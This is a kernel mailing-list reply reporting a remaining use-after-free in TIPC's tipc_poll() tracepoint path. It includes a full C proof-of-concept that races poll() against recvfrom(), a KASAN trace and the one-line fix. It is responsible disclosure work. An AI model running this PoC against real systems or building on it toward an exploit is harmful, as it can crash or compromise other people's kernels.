Received: from out203-205-221-153.mail.qq.com (out203-205-221-153.mail.qq.com [203.205.221.153])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 18BD31A683B
	for <stable@vger.kernel.org>; Sun, 21 Jun 2026 01:21:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.153
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782004890; cv=none; b=vCHH5YEiBDrcYJPpsrjiVPgoKzLq7bxQZ0gPKkZc51L0JnA6ttvpw2btexJepaCv7kq6SGYwwnzvVWiFo7evKspO9BlJtm7XzXehKNdgKssQFHWjnkjHSQV5SYlXUY2YzR9DyiFzidRXtZ8Bmm0kOskXjqyW7sWDkQDvQ+PCTVo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782004890; c=relaxed/simple;
	bh=EggYoqrQciqPs0pn2tt5ukce4ZLTqILelGx426v8Tqo=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=M0nkIWU77Vx1vlTpAUDuQnLIO3o57r24zm9QK4M/+fp+wz2pfc5ZBmAMJ7g7jMmrm3E6DizxohTpSV046v8UBhHWj3fYQXsn5bp+szupAlzUgEvC7EN1C4jkRD4TfUgL6bZKVtqc/u2Wg+uczh3Hr17DOOMWY9FC+XdVYfmafWY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=EftszPt7; arc=none smtp.client-ip=203.205.221.153
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="EftszPt7"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782004879; bh=buL0iljlDAYsIgsDDkjmf2YAglSTUJV9Y/UlOrfJ1Ps=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=EftszPt7/H/8ydMkyaJq8sJitWOeg0L67VOMcyTxoT1JnzBbB1K/qvZNXNe9xuu7t
	 5/7mf7SJ06vHON3MLWm8eysXDW7eJ8R0w7N/D5e53YlIESdFTAcvMa4/dKid2xe+9M
	 tWXChsLqmSzXvX5g8GfmEuVEiFmLbJQoibQVsRnA=
Received: from [192.168.1.100] ([58.19.27.181])
	by newxmesmtplogicsvrszb51-1.qq.com (NewEsmtp) with SMTP
	id 54F91E14; Sun, 21 Jun 2026 09:21:15 +0800
X-QQ-mid: xmsmtpt1782004875tzi0mi77w
Message-ID: <tencent_EC8B2032C1F9358EA3B49645F0F2277B210A@qq.com>
X-QQ-XMAILINFO: NdJjTjI40ejMHcPTV02nPtvT3JuLsF+Bzj1UXgZyAL3z0uFFvOca1jpHlTaQBx
	 o+L6auVMAadWgl/1p4Fh8RAW4pGPDABgEncTAvAOh+bHvu5GZpHbn5fgtEdjZJ2qH2wVZYFTnTZi
	 6zo5lDJNhKkRnEt8Ln3zDKbJCi9N9xWxbJ8QmgK2escXU1h840BCTFVN4GMZ4MCxbRJZx/wC0X8F
	 +EQ/BInprRrnPN38+PVEQW+79shWTYMrpOjmC/ea2hx+Lgqj9ZBP4yuw9hrCWLZHRh0SwiRC0K0w
	 +KuY7Cbb7gnmTZR43GOZ5zHh7ZhgfTnZc9lgaLu4JknVbm1KGLdcSvUQiifT8d2ViDiaC02KLh40
	 fjHy3KGtS//C2mO5iQiaxV9eZYq5sibUenh8A5konVSSVvHGwpsbYRhqQTWJd/TdrmCnbnjS8+OM
	 G6IRnEkFcHyLDEVKgt/mTIZDLV177tAmjY9Cf301/YpZCnSyOG7nwq7ByKULPXf7FT5Y2ja7KyM/
	 np7u8K7Dciz72wub8KUYpeFRrO0/tKJyDk/0/uZIInUhni2gJZeNmKQ2m02Z4tPllTUa/y78m1dM
	 kkBOuiuJa6OUygmF8rd476gRDYsKKrHzEgX4fb1UxYxZ0ipUyJcotjNrQdc5/Y3tU9aJ6U8y3Sq/
	 p85vnL2dreRlts07oDqjipktTD/uDFpRu+zumwS1qEzioiek/8uHyOmNJYuXxlkBw5yOoXADyM4o
	 xTHmP4c9RmiMYUKamAqHqd8ODixZ8umOW6LaHuPXIT+3lZ5WAJ+G6a+Mg6JXc982c113lGkQ/4Ez
	 PeJ9HZ/2G2lWzTa2OOG5B6RHruMZgDnx7J5Ziwg23rUgbW4PpXUw96wFQYNd1uoqmCf8ctASSzM6
	 aNuKI844h8QvF1MkGU9NEwO5r+rSZfH6elq3aNPoCcYJqNDWVeRWvNRUtbx0cf9MEeuBu/wSRutA
	 KbBYP4EF6T8lXKIs7hzpjns/wJvEiWO93LyRD97gfHae1HbpXYgtF3TP9drbi13jWpiw8+YJysgy
	 a2pxiuPqgM8PsyzxuUZTgruFk25Uk2Tn0uGw6VmbI7iMFu4B/S3k9VwSh2R4U=
X-QQ-XMRINFO: NI4Ajvh11aEjEMj13RCX7UuhPEoou2bs1g==
X-OQ-MSGID: <d219f159-95ea-4b14-8687-6bf841fa2762@qq.com>
Date: Sun, 21 Jun 2026 09:21:15 +0800
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH net] tipc: restrict socket queue dumps in enqueue
 tracepoints
To: Li Xiasong <lixiasong1@huawei.com>, Jon Maloy <jmaloy@redhat.com>
Cc: stable@vger.kernel.org, "David S. Miller" <davem@davemloft.net>,
 Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
 Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>,
 Ying Xue <ying.xue@windriver.com>, Tuong Lien <tuong.t.lien@dektech.com.au>,
 netdev@vger.kernel.org, tipc-discussion@lists.sourceforge.net,
 yuehaibing@huawei.com, zhangchangzhong@huawei.com, weiyongjun1@huawei.com
References: <20260611135647.3666727-1-lixiasong1@huawei.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260611135647.3666727-1-lixiasong1@huawei.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Li Xiasong,

I see this patch was merged into net.git as commit acd7df8d9554 — thanks
for the fix.  However, a Sashiko AI code review [1] flagged that
`tipc_poll()` in the same file has the identical pre-existing issue: it
calls `trace_tipc_sk_poll()` with `TIPC_DUMP_ALL`, which triggers a dump
of all socket queues without holding the socket owner lock.  The merged
fix addressed `tipc_sk_enqueue()` but left `tipc_poll()` unchanged.

I was able to reproduce the remaining use-after-free in QEMU with KASAN
by racing `tipc_poll()` against `tipc_recvmsg()` on the same socket.

On Wed, Jun 11, 2026 at 09:56:47PM +0800, Li Xiasong wrote:
 > This commit addresses a KASAN use-after-free issue in tipc_sk_enqueue()
 > by restricting tracepoints to only dump the backlog queue
 > (TIPC_DUMP_SK_BKLGQ) instead of all queues (TIPC_DUMP_ALL).

Your fix correctly restricts the `tipc_sk_enqueue()` tracepoints, but
`tipc_poll()` still uses `TIPC_DUMP_ALL`:

```c
// net/tipc/socket.c:tipc_poll()
trace_tipc_sk_poll(sk, NULL, TIPC_DUMP_ALL, " ");
```

This triggers `tipc_sk_dump()` → `tipc_list_dump()` to walk
`sk->sk_receive_queue` without holding `sk->sk_lock.slock`. If
`tipc_recvmsg()` concurrently dequeues and frees an skb from that
queue, the tracepoint dump reads freed memory.

[Reproduction]

Two threads on the same TIPC SOCK_DGRAM socket, with the
`tipc_sk_poll` tracepoint enabled:
- Thread 1: loops on poll() → trace_tipc_sk_poll → tipc_sk_dump
- Thread 2: loops on recvfrom() → frees skbs from the receive queue
   while the tracepoint walks it

Full PoC source (poc.c):
---8<----------------------------------------------------------------
// SPDX-License-Identifier: GPL-2.0-only
/*
  * tipc_poll() tracepoint use-after-free PoC
  * gcc -static -o poc poc.c -lpthread
  */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

#ifndef AF_TIPC
#define AF_TIPC         30
#endif

#define TIPC_SERVICE_RANGE      1
#define TIPC_SERVICE_ADDR       2
#define TIPC_CLUSTER_SCOPE      2

struct tipc_socket_addr { uint32_t ref; uint32_t node; };
struct sockaddr_tipc {
     unsigned short family;
     unsigned char  addrtype;
     signed   char  scope;
     union {
         struct tipc_socket_addr id;
         struct { uint32_t type; uint32_t lower; uint32_t upper; } nameseq;
         struct { struct { uint32_t type; uint32_t instance; } name;
                  uint32_t domain; } name;
     } addr;
};

static int running = 1;
static int server_fd = -1;

static int enable_tracepoint(void)
{
     const char *paths[] = {
         "/sys/kernel/debug/tracing/events/tipc/tipc_sk_poll/enable",
         "/sys/kernel/tracing/events/tipc/tipc_sk_poll/enable", NULL
     };
     for (int i = 0; paths[i]; i++) {
         int fd = open(paths[i], O_WRONLY|O_TRUNC);
         if (fd >= 0) { write(fd, "1", 1); close(fd); return 0; }
     }
     return -1;
}

static void *poll_thread(void *arg)
{
     struct pollfd pfd;
     (void)arg;
     while (running) {
         pfd.fd = server_fd; pfd.events = POLLIN; pfd.revents = 0;
         poll(&pfd, 1, 0);
     }
     return NULL;
}

static void *recv_thread(void *arg)
{
     char buf[4096];
     struct sockaddr_tipc src;
     socklen_t srclen = sizeof(src);
     (void)arg;
     while (running) {
         srclen = sizeof(src);
         recvfrom(server_fd, buf, sizeof(buf), MSG_DONTWAIT,
                  (struct sockaddr *)&src, &srclen);
         usleep(100);
     }
     return NULL;
}

int main(void)
{
     pthread_t poll_tid, recv_tid;
     uint32_t svc_type = 20000 + (getpid() % 40000);

     enable_tracepoint();
     server_fd = socket(AF_TIPC, SOCK_DGRAM, 0);

     struct sockaddr_tipc srv_addr = {0};
     srv_addr.family = AF_TIPC;
     srv_addr.addrtype = TIPC_SERVICE_RANGE;
     srv_addr.scope = TIPC_CLUSTER_SCOPE;
     srv_addr.addr.nameseq.type = svc_type;
     srv_addr.addr.nameseq.lower = 1;
     srv_addr.addr.nameseq.upper = 1;
     bind(server_fd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

     int client_fd = socket(AF_TIPC, SOCK_DGRAM, 0);
     struct sockaddr_tipc dest_addr = {0};
     dest_addr.family = AF_TIPC;
     dest_addr.addrtype = TIPC_SERVICE_ADDR;
     dest_addr.scope = TIPC_CLUSTER_SCOPE;
     dest_addr.addr.name.name.type = svc_type;
     dest_addr.addr.name.name.instance = 1;

     char sendbuf[256];
     memset(sendbuf, 0x41, sizeof(sendbuf));
     for (int i = 0; i < 50; i++)
         sendto(client_fd, sendbuf, sizeof(sendbuf), 0,
                (struct sockaddr *)&dest_addr, sizeof(dest_addr));
     usleep(100000);

     pthread_create(&poll_tid, NULL, poll_thread, NULL);
     pthread_create(&recv_tid, NULL, recv_thread, NULL);

     for (int i = 0; i < 2000; i++) {
         sendto(client_fd, sendbuf, sizeof(sendbuf), 0,
                (struct sockaddr *)&dest_addr, sizeof(dest_addr));
         usleep(500);
     }

     running = 0;
     pthread_join(poll_tid, NULL);
     pthread_join(recv_tid, NULL);
     close(client_fd);
     close(server_fd);
     printf("[+] Done. Check dmesg.\n");
     return 0;
}
---8<----------------------------------------------------------------
Compile: gcc -static -o poc poc.c -lpthread

[KASAN report — kernel 7.1.0-rc6+, CONFIG_KASAN=y]

   ==================================================================
   BUG: KASAN: slab-use-after-free in tipc_skb_dump+0x12e7/0x1590
   Read of size 4 at addr ffff888033f3d8d0 by task poc/9474

   Call Trace:
    <TASK>
    tipc_skb_dump+0x12e7/0x1590
    tipc_list_dump+0x276/0x330
    tipc_sk_dump+0xb6c/0xda0
    trace_event_raw_event_tipc_sk_class+0x364/0x590
    tipc_poll+0x44a/0x6b0
    sock_poll+0x.../...
    do_sys_poll+0x.../...
    __x64_sys_poll+0x.../...
    do_syscall_64+0xcd/0xf80
    entry_SYSCALL_64_after_hwframe+0x77/0x7f

   Freed by task 9475:
    kfree_skb_reason+0x.../...
    tipc_recvmsg+0x.../...
    sock_recvmsg+0x.../...
    sock_read_iter+0x.../...
    vfs_read+0x.../...
    ksys_read+0x.../...

The fix is the same as what was already applied to `tipc_sk_enqueue()` in
commit acd7df8d9554: change `TIPC_DUMP_ALL` to `TIPC_DUMP_SK_BKLGQ` in
the `tipc_poll()` tracepoint, since poll() does not hold the socket lock
that protects the other queues.

[1] 
https://sashiko.dev/#/patchset/20260611135647.3666727-1-lixiasong1%40huawei.com
     (Sashiko AI code review — "Use-After-Free", Severity: High)

Thanks,
XIAOWU


